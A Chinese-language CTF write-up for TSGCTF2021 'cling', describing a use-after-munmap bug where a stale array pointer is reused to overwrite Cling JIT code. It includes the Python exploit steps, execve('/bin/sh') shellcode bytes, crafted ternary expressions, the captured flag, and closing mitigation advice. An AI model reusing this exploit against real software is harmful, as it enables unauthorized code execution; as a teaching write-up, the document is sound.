# TSGCTF2021 cling WP

## 题目简述

题目把用户输入的算术/三目表达式交给 Cling C++ 解释器，动态生成 `map_func`，再对一个由 `mmap` 创建的整数数组执行 map。数组支持创建、权限修改和删除：

```c
buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

void del(void) {
    munmap(buf, 0x1000);
}
```

成功 `munmap` 后，程序没有把 `buf` 和 `n_elem` 清零，形成 use-after-munmap。目标是让后来 Cling JIT 分配的机器码页复用同一虚拟地址，再通过陈旧数组指针改写 JIT 代码。

## 解题过程

先创建一页数组并填入 0 到 99：

```python
numbers = list(range(100))
create(numbers)
delete()
```

此时页面已经解除映射，但全局 `buf` 仍保存旧地址，`n_elem` 仍为 100。接着注册 map 表达式。Cling 会在首次编译/执行函数时为 JIT 机器码申请页面；在题目固定环境中，内核复用了刚释放的页，所以：

```text
stale buf address == map_func JIT code address
```

表达式白名单只允许数字、`x`、四则运算和 `?:`，但这足以构造按输入机器码值分流的函数。官方 solver 把 27 字节 `execve("/bin/sh")` shellcode 切成四个 64 位整数，并用嵌套三目表达式在识别到若干 JIT 指令字时返回对应 shellcode 块；另一个分支返回编码后的向后跳转：

```python
shellcode = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    b"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)
values = [
    u64(shellcode[i:i + 8].ljust(8, b"\x00"))
    for i in range(0, len(shellcode), 8)
]

backward_jump = 0xffffff5be9  # jmp -0xa0
s3 = f"x/72057594037927936-63?{backward_jump}:{values[3]}"
s2 = f"x*0x1000000/72057594037927936-191?{s3}:{values[2]}"
s1 = f"x/72057594037927936-72?{s2}:{values[1]}"
expr = f"x/72057594037927936-64?{s1}:{values[0]}"
```

具体常量来自题目版本中 `map_func` 的 JIT 机器码，不具备跨版本通用性。注册完成后，把陈旧 `buf` 所指页面改成可读、可写、可执行：

```text
protect: read=y, write=y, exec=y
```

执行 `run_map` 时，程序把每次 `map_func` 的返回值写回 `buf[i]`。由于 `buf` 实际覆盖 JIT 页，这些写操作把正在使用的机器码逐块改成 shellcode；预先构造的跳转最终把控制流送入新代码，执行：

```c
execve("/bin/sh", NULL, NULL);
```

进入 shell 后读取：

```text
TSGCTF{Have_you_ever_solved_Use_After_Munmap_chal?}
```

## 方法总结

本题的核心不是绕过表达式字符过滤，而是虚拟地址生命周期错误。`munmap` 让页面失效，却不让保存该地址的 C 指针自动失效；下一次 JIT 映射复用同一地址后，陈旧指针便指向完全不同的安全域。清理映射后必须同时重置指针和长度，并在每次使用前验证对象状态；JIT 代码页也应遵循 W^X，避免同一页面在执行阶段仍可写。
